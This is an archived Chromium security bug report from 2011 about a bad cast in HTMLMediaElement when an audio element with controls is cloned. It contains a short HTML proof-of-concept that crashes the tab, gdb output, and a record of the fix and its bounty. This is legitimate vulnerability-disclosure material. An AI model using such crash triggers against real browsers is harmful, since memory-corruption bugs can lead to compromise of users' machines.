# Bad cast in HTMLMediaElement::mediaControls

| Field | Value |
|-------|-------|
| **Issue ID** | [40091423](https://issues.chromium.org/issues/40091423) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ma...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-05-31 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Under certain circumstances, chromium will crash when cloning an audio node. This issue only seems to affect the dev branch. The reproduction case provided does not crash reliably in debugging builds, but does cause a crash in release builds.

**VERSION**  

Chrome Version: Tested in Chromium 13.0.781.0 and Google Chrome 13.0.772.0 (dev)  

Operating System: Ubuntu 11.04 (64-bit) and Ubuntu 10.10 (32-bit)

**REPRODUCTION CASE**

<html>
<body onload="boom();">
<script type="text/javascript">
function boom() {
node = document.createElement('audio');
node.setAttribute('src', 'blah');
node.setAttribute('controls', 'blah');
node.style.fontWeight = '100';
node.cloneNode(false);
}
</script>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

$ gdb out/Release/chrome  

(gdb) r --single-process tests/crash.html

Program received signal SIGSEGV, Segmentation fault.  

[Switching to Thread 0x7fffd48ae700 (LWP 15274)]  

0x0000000000000000 in ?? ()  

(gdb) bt  

#0 0x0000000000000000 in ?? ()  

#1 0x00000000014ec1fa in WebCore::HTMLMediaElement::loadResource(WebCore::KURL const&, WebCore::ContentType&) ()  

#2 0x00000000014ed675 in WebCore::HTMLMediaElement::selectMediaResource() ()  

#3 0x000000000158d7b2 in WebCore::ThreadTimers::sharedTimerFiredInternal() ()  

#4 0x0000000002067ece in (anonymous namespace)::TaskClosureAdapter::Run() ()  

#5 0x00000000020685c7 in MessageLoop::RunTask(MessageLoop::PendingTask const&) ()  

#6 0x000000000206c3b8 in MessageLoop::DeferOrRunPendingTask(MessageLoop::PendingTask const&) ()  

#7 0x000000000206c7b1 in MessageLoop::DoWork() ()  

#8 0x000000000206db29 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) ()  

#9 0x0000000002068a45 in MessageLoop::RunInternal() ()  

#10 0x0000000002068c10 in MessageLoop::Run() ()  

#11 0x000000000209678a in base::Thread::ThreadMain() ()  

#12 0x0000000002095c52 in base::(anonymous namespace)::ThreadFunc(void\*) ()  

#13 0x00007ffff4017d8c in start\_thread (arg=0x7fffd48ae700)  

at pthread\_create.c:304  

#14 0x00007ffff211104d in clone ()  

at ../sysdeps/unix/sysv/linux/x86\_64/clone.S:112  

#15 0x0000000000000000 in ?? ()  

(gdb) frame 1  

#1 0x00000000014ec1fa in WebCore::HTMLMediaElement::loadResource(WebCore::KURL const&, WebCore::ContentType&) ()  

(gdb) disas  

Dump of assembler code for function \_ZN7WebCore16HTMLMediaElement12loadResourceERKNS\_4KURLERNS\_11ContentTypeE:  

0x00000000014ebfc0 <+0>: push %r12  

0x00000000014ebfc2 <+2>: push %rbp  

0x00000000014ebfc3 <+3>: mov %rdx,%rbp  

...  

0x00000000014ec1e6 <+550>: mov 0x258(%rbx),%rdi  

0x00000000014ec1ed <+557>: callq 0x15c1bb0 <\_ZN7WebCore11MediaPlayer17setPreservesPitchEb>  

0x00000000014ec1f2 <+562>: mov %rbx,%rdi  

0x00000000014ec1f5 <+565>: callq 0x14ebef0 <\_ZN7WebCore16HTMLMediaElement12updateVolumeEv>  

=> 0x00000000014ec1fa <+570>: lea 0x1b8(%rbx),%rdi  

0x00000000014ec201 <+577>: callq 0x157ddb0 <\_ZNK7WebCore17KURLGooglePrivate6stringEv>  

0x00000000014ec206 <+582>: mov 0x258(%rbx),%rdi  

0x00000000014ec20d <+589>: mov %rax,%rsi  

0x00000000014ec210 <+592>: mov %rbp,%rdx  

0x00000000014ec213 <+595>: callq 0x15c1500 <\_ZN7WebCore11MediaPlayer4loadERKN3WTF6StringERKNS\_11ContentTypeE>  

0x00000000014ec218 <+600>: mov (%rbx),%rax  

0x00000000014ec21b <+603>: mov %rbx,%rdi  

0x00000000014ec21e <+606>: callq \*0x5c8(%rax)  

0x00000000014ec224 <+612>: mov 0x40(%rbx),%rdi  

0x00000000014ec228 <+616>: test %rdi,%rdi  

0x00000000014ec22b <+619>: je 0x14ec236 <\_ZN7WebCore16HTMLMediaElement12loadResourceERKNS\_4KURLERNS\_11ContentTypeE+630>  

0x00000000014ec22d <+621>: mov (%rdi),%rax  

0x00000000014ec230 <+624>: callq \*0x310(%rax)  

0x00000000014ec236 <+630>: mov 0x58(%rsp),%rbx  

0x00000000014ec23b <+635>: test %rbx,%rbx  

0x00000000014ec23e <+638>: je 0x14ec24c <\_ZN7WebCore16HTMLMediaElement12loadResourceERKNS\_4KURLERNS\_11ContentTypeE+652>  

0x00000000014ec240 <+640>: mov (%rbx),%eax  

0x00000000014ec242 <+642>: add $0xffffffffffffff80,%eax  

0x00000000014ec245 <+645>: mov %eax,(%rbx)  

0x00000000014ec247 <+647>: and $0xffffffffffffffc0,%eax  

0x00000000014ec24a <+650>: je 0x14ec270 <\_ZN7WebCore16HTMLMediaElement12loadResourceERKNS\_4KURLERNS\_11ContentTypeE+688>  

0x00000000014ec24c <+652>: mov 0x48(%rsp),%rbx  

0x00000000014ec251 <+657>: test %rbx,%rbx  

0x00000000014ec254 <+660>: je 0x14ec262 <\_ZN7WebCore16HTMLMediaElement---Type <return> to continue, or q <return> to quit---q  

Quit  

(gdb) i r  

rax 0x58c1c80 93068416  

rbx 0x587cb00 92785408  

rcx 0x8e72b77b 2389882747  

rdx 0x0 0  

rsi 0x522b410 86160400  

rdi 0x58c1c80 93068416  

rbp 0x7fffd48ad270 0x7fffd48ad270  

rsp 0x7fffd48ad180 0x7fffd48ad180  

r8 0x7f 127  

r9 0x587cb00 92785408  

r10 0x3 3  

r11 0x58c22a0 93069984  

r12 0x0 0  

r13 0x3d20640 64095808  

r14 0x0 0  

r15 0x3 3  

rip 0x14ec1fa 0x14ec1fa <WebCore::HTMLMediaElement::loadResource(WebCore::KURL const&, WebCore::ContentType&)+570>  

eflags 0x10202 [ IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

fs 0x0 0  

gs 0x0 0  

(gdb)

## Attachments

- [gdb.txt](attachments/gdb.txt) (text/plain; charset=us-ascii, 14.1 KB)
- [crash.html](attachments/crash.html) (text/html; charset=us-ascii, 286 B)

## Timeline

### in...@chromium.org (2011-05-31)

Very nice catch Marty. 

I am still unsure about milestone, will add the tags later.

### in...@chromium.org (2011-05-31)


MediaControls* HTMLMediaElement::mediaControls()
{
    if (!shadowRoot())
        return 0;

    Node* node = shadowRoot()->firstChild();
    ASSERT(node->isHTMLElement());
    return static_cast<MediaControls*>(node);
}

### sc...@gmail.com (2011-05-31)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-05-31)

Committed r87743: <http://trac.webkit.org/changeset/87743

### sc...@gmail.com (2011-05-31)

@inferno: do we know which versions are affected?

### in...@chromium.org (2011-05-31)

affects m12, not m11. http://trac.webkit.org/browser/trunk/Source/WebCore/html/HTMLMediaElement.cpp?annotate=blame&rev=84077

### in...@chromium.org (2011-05-31)

merged to m12 in r87761. needs merging to m13. (webkit roll won't happen until tmrw).

### sc...@gmail.com (2011-06-03)

WebKit for M13 branch at r87771 so no further merging needed.

### sc...@gmail.com (2011-06-03)

@MartyBarbella: thanks for catching this! We were able to prevent this regression from ever hitting stable. This makes us happy :)
Please accept a $1000 Chromium Security Reward.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sk...@chromium.org (2011-06-06)

Note to self: chrome.dll!WebCore::HTMLMediaElement::updatePlayState ExecAV@Arbitrary (f4548ee7bd17dc4da624b4b32693c9dc)


### sc...@gmail.com (2011-06-09)

Invoice finalized; payment is in e-payment system; it can take a couple of weeks.

### ke...@chromium.org (2011-09-22)

https://bugs.webkit.org/show_bug.cgi?id=61765

### js...@chromium.org (2011-10-05)

Batch update.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/84452?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091423)*
